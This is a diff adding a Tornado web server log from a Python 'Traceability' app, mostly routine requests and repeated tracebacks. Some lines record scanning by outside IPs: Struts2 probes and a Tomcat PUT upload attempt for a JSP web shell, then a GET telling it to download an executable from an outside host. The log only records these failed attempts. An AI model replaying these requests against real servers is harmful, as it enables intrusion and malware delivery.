@@ -1,0 +1,282 @@
+2019-05-14 03:18:14,286 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-14 07:09:42,690 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-14 11:03:14,551 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-14 14:56:32,598 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-14 18:50:07,798 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-14 22:43:38,043 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-15 02:36:17,209 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-15 06:29:37,394 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-15 08:54:21,727 - tornado.access - WARNING - 404 GET / (60.191.38.78) 0.00ms
+2019-05-15 10:23:14,140 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-15 10:48:44,296 - tornado.access - WARNING - 404 GET /struts2-rest-showcase/orders.xhtml (39.106.180.40) 16.00ms
+2019-05-15 10:48:44,296 - tornado.access - WARNING - 404 GET /index.action (39.106.180.40) 0.00ms
+2019-05-15 10:48:44,296 - tornado.access - WARNING - 404 GET /index.do (39.106.180.40) 0.00ms
+2019-05-15 14:16:51,579 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-15 18:10:40,078 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-15 22:04:24,483 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-16 01:57:20,849 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-16 05:50:47,184 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-16 08:39:59,240 - tornado.access - WARNING - 404 GET / (198.108.67.48) 0.00ms
+2019-05-16 09:44:13,552 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 16.00ms
+2019-05-16 10:44:17,328 - tornado.access - WARNING - 404 PUT /FxCodeShell.jsp%20 (39.106.115.10) 0.00ms
+2019-05-16 10:44:17,328 - tornado.access - WARNING - 404 PUT /FxCodeShell.jsp::$DATA (39.106.115.10) 0.00ms
+2019-05-16 10:44:17,342 - tornado.access - WARNING - 404 PUT /FxCodeShell.jsp/ (39.106.115.10) 15.00ms
+2019-05-16 10:44:17,342 - tornado.access - WARNING - 404 GET /FxCodeShell.jsp?view=FxxkMyLie1836710Aa&os=1&address=http://fid.hognoob.se/download.exe (39.106.115.10) 0.00ms
+2019-05-16 11:02:52,538 - tornado.access - WARNING - 404 GET / (47.97.23.199) 0.00ms
+2019-05-16 13:37:39,619 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 0.00ms
+2019-05-16 17:31:14,243 - tornado.access - WARNING - 404 GET http://www.baidu.com/cache/global/img/gs.gif (93.174.93.136) 16.00ms
+2019-05-16 20:12:47,332 - tornado.application - ERROR - Uncaught exception POST /selectCompany (117.159.73.196)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectCompany', version='HTTP/1.1', remote_ip='117.159.73.196')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectCompanyHandler.py", line 14, in post
+    company=Dal_Company().selectCompany(post_data["id"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:12:47,394 - tornado.access - ERROR - 500 POST /selectCompany (117.159.73.196) 62.00ms
+2019-05-16 20:19:31,799 - tornado.application - ERROR - Uncaught exception POST /selectCompany (117.159.73.196)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectCompany', version='HTTP/1.1', remote_ip='117.159.73.196')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectCompanyHandler.py", line 14, in post
+    company=Dal_Company().selectCompany(post_data["id"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:19:31,799 - tornado.access - ERROR - 500 POST /selectCompany (117.159.73.196) 0.00ms
+2019-05-16 20:20:31,207 - tornado.application - ERROR - Uncaught exception POST /selectCompany (117.159.73.196)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectCompany', version='HTTP/1.1', remote_ip='117.159.73.196')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectCompanyHandler.py", line 14, in post
+    company=Dal_Company().selectCompany(post_data["id"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:20:31,207 - tornado.access - ERROR - 500 POST /selectCompany (117.159.73.196) 0.00ms
+2019-05-16 20:21:25,494 - tornado.application - ERROR - Uncaught exception POST /selectCompany (117.159.73.196)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectCompany', version='HTTP/1.1', remote_ip='117.159.73.196')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectCompanyHandler.py", line 14, in post
+    company=Dal_Company().selectCompany(post_data["id"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:21:25,494 - tornado.access - ERROR - 500 POST /selectCompany (117.159.73.196) 0.00ms
+2019-05-16 20:21:29,411 - tornado.application - ERROR - Uncaught exception POST /selectCompany (39.106.5.116)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectCompany', version='HTTP/1.1', remote_ip='39.106.5.116')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectCompanyHandler.py", line 14, in post
+    company=Dal_Company().selectCompany(post_data["id"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:21:29,414 - tornado.access - ERROR - 500 POST /selectCompany (39.106.5.116) 2.00ms
+2019-05-16 20:21:36,548 - tornado.application - ERROR - Uncaught exception POST /SelectStaffByCompany (39.106.5.116)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/SelectStaffByCompany', version='HTTP/1.1', remote_ip='39.106.5.116')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectStaffByCompanyHandler.py", line 15, in post
+    company=Dal_Company().selectCompany(post_data["companyId"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:21:36,559 - tornado.access - ERROR - 500 POST /SelectStaffByCompany (39.106.5.116) 13.00ms
+2019-05-16 20:21:38,252 - tornado.application - ERROR - Uncaught exception POST /selectAllWarehouse (39.106.5.116)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectAllWarehouse', version='HTTP/1.1', remote_ip='39.106.5.116')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectAllWarehouseHandler.py", line 19, in post
+    comp = Dal_Company().selectCompany(c_id)
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:21:38,253 - tornado.access - ERROR - 500 POST /selectAllWarehouse (39.106.5.116) 3.00ms
+2019-05-16 20:22:05,181 - tornado.application - ERROR - Uncaught exception POST /selectCompany (39.106.5.116)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectCompany', version='HTTP/1.1', remote_ip='39.106.5.116')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectCompanyHandler.py", line 14, in post
+    company=Dal_Company().selectCompany(post_data["id"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:22:05,183 - tornado.access - ERROR - 500 POST /selectCompany (39.106.5.116) 2.00ms
+2019-05-16 20:22:28,519 - tornado.access - INFO - 200 POST /Login (117.159.73.196) 0.00ms
+2019-05-16 20:22:29,940 - tornado.access - INFO - 200 POST /selectCompany (117.159.73.196) 0.00ms
+2019-05-16 20:22:33,720 - tornado.application - ERROR - Uncaught exception POST /selectCompany (39.106.5.116)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectCompany', version='HTTP/1.1', remote_ip='39.106.5.116')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectCompanyHandler.py", line 14, in post
+    company=Dal_Company().selectCompany(post_data["id"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:22:33,720 - tornado.access - ERROR - 500 POST /selectCompany (39.106.5.116) 0.00ms
+2019-05-16 20:22:41,721 - tornado.access - INFO - 200 POST /selectAllManifestBcSend (117.159.73.196) 0.00ms
+2019-05-16 20:22:43,003 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 0.00ms
+2019-05-16 20:22:44,894 - tornado.access - INFO - 200 POST /selectAllProd (117.159.73.196) 0.00ms
+2019-05-16 20:22:47,269 - tornado.access - INFO - 200 POST /SelectStaffByCompany (117.159.73.196) 0.00ms
+2019-05-16 20:22:48,505 - tornado.access - INFO - 200 POST /selectAllWarehouse (117.159.73.196) 16.00ms
+2019-05-16 20:22:50,487 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 0.00ms
+2019-05-16 20:22:50,983 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 1.00ms
+2019-05-16 20:22:55,112 - tornado.access - INFO - 200 POST /selectAllManifestBcSend (117.159.73.196) 0.00ms
+2019-05-16 20:22:55,549 - tornado.access - INFO - 200 POST /selectBatchBs (117.159.73.196) 0.00ms
+2019-05-16 20:22:57,285 - tornado.access - INFO - 200 POST /selectAllProd (117.159.73.196) 0.00ms
+2019-05-16 20:22:59,003 - tornado.access - INFO - 200 POST /SelectStaffByCompany (117.159.73.196) 0.00ms
+2019-05-16 20:22:59,221 - tornado.access - INFO - 200 POST /SelectStaffByCompany (117.159.73.196) 0.00ms
+2019-05-16 20:22:59,753 - tornado.access - INFO - 200 POST /selectAllWarehouse (117.159.73.196) 0.00ms
+2019-05-16 20:23:23,253 - tornado.access - INFO - 200 POST /Login (117.159.73.196) 0.00ms
+2019-05-16 20:23:24,785 - tornado.access - INFO - 200 POST /selectCompany (117.159.73.196) 0.00ms
+2019-05-16 20:23:37,924 - tornado.access - INFO - 200 POST /SelectStaffByCompany (117.159.73.196) 0.00ms
+2019-05-16 20:23:38,003 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/1.jpg (117.159.73.196) 15.00ms
+2019-05-16 20:23:38,019 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/6.jpg (117.159.73.196) 16.00ms
+2019-05-16 20:23:38,019 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/5.jpg (117.159.73.196) 0.00ms
+2019-05-16 20:23:58,660 - tornado.access - INFO - 200 POST /selectAllWarehouse (117.159.73.196) 0.00ms
+2019-05-16 20:24:02,596 - tornado.access - INFO - 200 POST /selectAllProd (117.159.73.196) 0.00ms
+2019-05-16 20:24:05,285 - tornado.access - INFO - 200 POST /selectAllManifestBcSend (117.159.73.196) 0.00ms
+2019-05-16 20:24:05,799 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 0.00ms
+2019-05-16 20:24:06,503 - tornado.access - INFO - 200 POST /selectBatchBs (117.159.73.196) 0.00ms
+2019-05-16 20:24:06,535 - tornado.access - WARNING - 404 GET /static/QrCode_img/static/img/production/2.jpg (117.159.73.196) 0.00ms
+2019-05-16 20:24:06,535 - tornado.access - INFO - 200 GET /static/BarCode_img/00015.png (117.159.73.196) 0.00ms
+2019-05-16 20:24:06,535 - tornado.access - INFO - 200 GET /static/QrCode_img/00015.png (117.159.73.196) 0.00ms
+2019-05-16 20:24:32,707 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 0.00ms
+2019-05-16 20:24:35,910 - tornado.access - INFO - 200 POST /selectAllManifestBcSend (117.159.73.196) 0.00ms
+2019-05-16 20:24:37,519 - tornado.access - INFO - 200 POST /getAllwcs (117.159.73.196) 0.00ms
+2019-05-16 20:24:42,549 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 0.00ms
+2019-05-16 20:24:50,285 - tornado.access - INFO - 200 POST /selectAllManifestBcSend (117.159.73.196) 0.00ms
+2019-05-16 20:24:50,815 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 0.00ms
+2019-05-16 20:25:00,931 - tornado.access - INFO - 200 POST /selectBatchBs (117.159.73.196) 7.00ms
+2019-05-16 20:25:00,957 - tornado.access - WARNING - 404 GET /static/QrCode_img/static/img/production/2.jpg (117.159.73.196) 0.00ms
+2019-05-16 20:25:10,128 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 0.00ms
+2019-05-16 20:25:10,535 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 0.00ms
+2019-05-16 20:25:11,144 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 0.00ms
+2019-05-16 20:25:13,285 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 0.00ms
+2019-05-16 20:25:48,519 - tornado.application - ERROR - Uncaught exception POST /updateManifest (117.159.73.196)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/updateManifest', version='HTTP/1.1', remote_ip='117.159.73.196')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\UpdateManifestHandler.py", line 27, in post
+    if(Dal_Manifest().updateManifest(post_data["id"],**new)==1):
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_manifest.py", line 27, in updateManifest
+    return self.update(pk,Manifest,**kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_base.py", line 60, in update
+    return self._m_cache[pk].update(pk, **kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\orm\orm.py", line 122, in update
+    print('SQL: %s' % sql)
+IOError: [Errno 22] Invalid argument
+2019-05-16 20:25:48,622 - tornado.access - ERROR - 500 POST /updateManifest (117.159.73.196) 103.00ms
+2019-05-16 20:26:00,269 - tornado.application - ERROR - Uncaught exception POST /updateManifest (117.159.73.196)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/updateManifest', version='HTTP/1.1', remote_ip='117.159.73.196')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\UpdateManifestHandler.py", line 27, in post
+    if(Dal_Manifest().updateManifest(post_data["id"],**new)==1):
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_manifest.py", line 27, in updateManifest
+    return self.update(pk,Manifest,**kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_base.py", line 60, in update
+    return self._m_cache[pk].update(pk, **kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\orm\orm.py", line 122, in update
+    print('SQL: %s' % sql)
+IOError: [Errno 22] Invalid argument
+2019-05-16 20:26:00,269 - tornado.access - ERROR - 500 POST /updateManifest (117.159.73.196) 0.00ms
+2019-05-16 20:26:07,601 - tornado.access - INFO - 200 POST /SelectStaffByCompany (117.159.73.196) 1.00ms
+2019-05-16 20:26:07,628 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/1.jpg (117.159.73.196) 1.00ms
+2019-05-16 20:26:07,631 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/5.jpg (117.159.73.196) 1.00ms
+2019-05-16 20:26:07,634 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/6.jpg (117.159.73.196) 1.00ms
+2019-05-16 20:26:08,776 - tornado.access - INFO - 200 POST /SelectStaffByCompany (117.159.73.196) 0.00ms
+2019-05-16 20:26:08,799 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/1.jpg (117.159.73.196) 0.00ms
+2019-05-16 20:26:08,799 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/5.jpg (117.159.73.196) 0.00ms
+2019-05-16 20:26:08,799 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/6.jpg (117.159.73.196) 0.00ms
+2019-05-16 20:26:10,190 - tornado.access - INFO - 200 POST /selectAllWarehouse (117.159.73.196) 0.00ms
+2019-05-16 20:26:11,786 - tornado.access - INFO - 200 POST /selectAllProd (117.159.73.196) 1.00ms
+2019-05-16 20:26:14,628 - tornado.access - INFO - 200 POST /selectBatchBs (117.159.73.196) 0.00ms
+2019-05-16 20:26:14,660 - tornado.access - WARNING - 404 GET /static/QrCode_img/static/img/production/2.jpg (117.159.73.196) 0.00ms
+2019-05-16 20:26:16,920 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 1.00ms
+2019-05-16 20:26:17,332 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 0.00ms
+2019-05-16 20:26:18,619 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 1.00ms
+2019-05-16 20:26:20,424 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 15.00ms
+2019-05-16 20:26:20,648 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 1.00ms
+2019-05-16 20:26:21,062 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 1.00ms
+2019-05-16 20:26:22,954 - tornado.access - INFO - 200 POST /selectBatchBs (117.159.73.196) 0.00ms
+2019-05-16 20:26:22,983 - tornado.access - WARNING - 404 GET /static/QrCode_img/static/img/production/2.jpg (117.159.73.196) 2.00ms
+2019-05-16 20:26:24,220 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 1.00ms
+2019-05-16 20:28:24,617 - tornado.application - ERROR - Uncaught exception POST /selectCompany (39.106.5.116)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectCompany', version='HTTP/1.1', remote_ip='39.106.5.116')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectCompanyHandler.py", line 14, in post
+    company=Dal_Company().selectCompany(post_data["id"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:28:24,617 - tornado.access - ERROR - 500 POST /selectCompany (39.106.5.116) 0.00ms
+2019-05-16 20:28:51,700 - tornado.application - ERROR - Uncaught exception POST /selectCompany (39.106.5.116)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectCompany', version='HTTP/1.1', remote_ip='39.106.5.116')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectCompanyHandler.py", line 14, in post
+    company=Dal_Company().selectCompany(post_data["id"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:28:51,703 - tornado.access - ERROR - 500 POST /selectCompany (39.106.5.116) 2.00ms
+2019-05-16 20:31:49,325 - tornado.application - ERROR - Uncaught exception POST /selectCompany (117.159.73.196)
+HTTPServerRequest(protocol='http', host='39.106.5.116:8010', method='POST', uri='/selectCompany', version='HTTP/1.1', remote_ip='117.159.73.196')
+Traceback (most recent call last):
+  File "C:\Python27\lib\site-packages\tornado\web.py", line 1590, in _execute
+    result = method(*self.path_args, **self.path_kwargs)
+  File "C:\Users\Administrator\Desktop\Traceability\handlers\managehandlers\SelectCompanyHandler.py", line 14, in post
+    company=Dal_Company().selectCompany(post_data["id"])
+  File "C:\Users\Administrator\Desktop\Traceability\dal\dal_company.py", line 57, in selectCompany
+    pk = int(pk)
+ValueError: invalid literal for int() with base 10: ''
+2019-05-16 20:31:49,326 - tornado.access - ERROR - 500 POST /selectCompany (117.159.73.196) 2.00ms
+2019-05-16 20:32:00,960 - tornado.access - INFO - 200 POST /Login (117.159.73.196) 1.00ms
+2019-05-16 20:32:02,509 - tornado.access - INFO - 200 POST /selectCompany (117.159.73.196) 0.00ms
+2019-05-16 20:32:02,651 - tornado.access - WARNING - 404 GET /static/img/company/static/img/company/7/7_P.jpg (117.159.73.196) 2.00ms
+2019-05-16 20:32:02,668 - tornado.access - WARNING - 404 GET /static/img/company/static/img/company/7/7_s.jpg (117.159.73.196) 2.00ms
+2019-05-16 20:32:02,671 - tornado.access - WARNING - 404 GET /static/img/company/static/img/company/7/7_b.jpg (117.159.73.196) 1.00ms
+2019-05-16 20:32:07,591 - tornado.access - INFO - 200 POST /SelectStaffByCompany (117.159.73.196) 0.00ms
+2019-05-16 20:32:07,651 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/2.jpg (117.159.73.196) 2.00ms
+2019-05-16 20:32:07,654 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/4.jpg (117.159.73.196) 1.00ms
+2019-05-16 20:32:07,667 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/7.jpg (117.159.73.196) 2.00ms
+2019-05-16 20:32:07,674 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/8.jpg (117.159.73.196) 2.00ms
+2019-05-16 20:32:07,680 - tornado.access - WARNING - 404 GET /static/img/staff/static/img/staff/9.jpg (117.159.73.196) 2.00ms
+2019-05-16 20:32:12,426 - tornado.access - INFO - 200 POST /selectAllWarehouse (117.159.73.196) 1.00ms
+2019-05-16 20:32:14,770 - tornado.access - INFO - 200 POST /selectAllProd (117.159.73.196) 1.00ms
+2019-05-16 20:32:20,648 - tornado.access - INFO - 200 POST /selectAllManifestBcSend (117.159.73.196) 0.00ms
+2019-05-16 20:32:21,677 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 0.00ms
+2019-05-16 20:32:22,490 - tornado.access - INFO - 200 POST /selectBatchBs (117.159.73.196) 1.00ms
+2019-05-16 20:32:24,183 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 2.00ms
+2019-05-16 20:32:24,875 - tornado.access - INFO - 200 POST /selectAllLogistics (117.159.73.196) 2.00ms
+2019-05-16 20:32:45,013 - tornado.access - INFO - 200 POST /Login (117.159.73.196) 1.00ms
+2019-05-16 20:32:46,992 - tornado.access - INFO - 200 POST /selectCompany (117.159.73.196) 1.00ms
+2019-05-16 20:32:47,026 - tornado.access - WARNING - 404 GET /static/img/company/static/img/company/6/6_P.jpg (117.159.73.196) 2.00ms
+2019-05-16 20:32:47,028 - tornado.access - WARNING - 404 GET /static/img/company/static/img/company/6/6_b.jpg (117.159.73.196) 2.00ms
+2019-05-16 20:32:47,029 - tornado.access - WARNING - 404 GET /static/img/company/static/img/company/6/6_s.jpg (117.159.73.196) 1.00ms
+2019-05-16 20:32:51,404 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 1.00ms
+2019-05-16 20:40:31,174 - tornado.access - INFO - 200 POST /selectCompany (117.159.73.196) 1.00ms
+2019-05-16 20:40:35,132 - tornado.access - INFO - 200 POST /selectAllProd (117.159.73.196) 1.00ms
+2019-05-16 20:40:36,417 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 1.00ms
+2019-05-16 20:40:37,003 - tornado.access - INFO - 200 POST /selectAllManifestBcSend (117.159.73.196) 2.00ms
+2019-05-16 20:40:37,546 - tornado.access - INFO - 200 POST /selectAllManifestBcGet (117.159.73.196) 1.00ms
+2019-05-16 20:40:38,165 - tornado.access - INFO - 200 POST /selectBatchBs (117.159.73.196) 1.00ms
+2019-05-16 20:40:38,216 - tornado.access - WARNING - 404 GET /static/QrCode_img/static/img/production/2.jpg (117.159.73.196) 2.00ms
